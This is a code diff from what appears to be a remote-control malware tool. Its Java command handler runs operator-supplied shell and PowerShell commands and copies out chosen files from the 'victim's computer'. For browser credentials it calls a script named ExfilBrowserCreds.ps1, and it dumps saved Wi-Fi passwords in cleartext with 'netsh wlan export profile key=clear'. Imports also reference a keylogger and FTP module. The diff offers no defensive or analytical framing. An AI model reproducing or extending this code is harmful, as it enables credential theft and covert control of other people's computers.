@@ -8,7 +8,6 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import javax.imageio.ImageIO;
 import com.github.thatcherdev.usbware.backend.DuckyScripts;
-import com.github.thatcherdev.usbware.backend.Exfil;
 import com.github.thatcherdev.usbware.backend.FTP;
 import com.github.thatcherdev.usbware.backend.KeyLogger;
 import com.github.thatcherdev.usbware.backend.Utils;
@@ -32,29 +31,20 @@ public class HandleCommand {
 		else if(command.startsWith("cmd"))
 			send=Utils.runCommand(command.substring(4));
 		else if(command.startsWith("ps"))
-			if(Utils.runPSScript(command.substring(3)))
-				send="PowerShell script '"+command.substring(3)+"' successfully ran";
-			else
-				send="An error occurred when trying to run PowerShell script '"+command.substring(3)+"'";
+			send=Utils.runPSScript(command.substring(3));
 		else if(command.startsWith("ds"))
 			if(DuckyScripts.run(command.substring(3)))
 				send="DuckyScript '"+command.substring(3)+"' successfully ran";
 			else
 				send="An error occurred when trying to run DuckyScript '"+command.substring(3)+"'";
 		else if(command.startsWith("exfiles"))
-			if(Exfil.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")), new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*")+1).split(",")))))
+			if(Utils.exfilFiles(command.substring(command.indexOf(" "), command.indexOf("*")), new ArrayList<String>(Arrays.asList(command.substring(command.indexOf("*")+1).split(",")))))
 				send="Files exfiltrated to '"+System.getProperty("user.dir")+"\\gathered\\ExfiltedFiles' on victim's computer";
 			else
 				send="An error occurred when trying to exfiltrate files";
 		else if(command.equals("expass")){
-			if(Exfil.exfilBroserCreds())
-				send+="Microsoft Edge and Internet Explorer passwords exfiltrated to '"+System.getProperty("user.dir")+"\\gathered\\BrowserPasswords.txt' on vitim's computer\n";
-			else
-				send+="An error occurred when trying to exfiltrate Microsoft Edge and Internet Explorer passwords\n";
-			if(Exfil.exfilWiFi())
-				send+="WiFi passwords exfiltrated to '"+System.getProperty("user.dir")+"\\gathered\\WiFiPasswords.txt' on victim's computer";
-			else
-				send+="An error occurred when trying to exfiltrate WiFi passwords";
+			send+=Utils.runPSScript("ExfilBrowserCreds.ps1")+"\n";
+			send+=Utils.runCommand("netsh wlan export profile key=clear folder="+System.getProperty("user.dir")+"\\gathered");
 		}else if(command.startsWith("filesend")){
 			try{
 				Thread.sleep(2000);
